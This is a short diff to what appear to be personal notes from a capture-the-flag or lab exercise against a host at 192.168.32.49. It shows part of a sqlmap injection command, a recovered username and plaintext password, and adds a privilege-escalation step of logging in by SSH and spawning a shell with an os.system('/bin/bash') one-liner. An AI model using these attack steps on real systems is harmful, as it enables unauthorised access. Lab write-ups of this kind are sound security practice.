@@ -43,4 +43,13 @@ sqlmap -u "http://192.168.32.49/checklogin.php" --data "myusername=%27&mypasswor
  UNAME: three
  PASSWD: easy1230
  
+ /////////////////////
+ Priv ESC
+ 
+ SSH into three@192.168.32.49
+ PASSWD - easy1230
+ 
+ SPAWN AN INTERACTIVE SHELL
+ /////////////////////
+ echo os.system('/bin/bash')
  
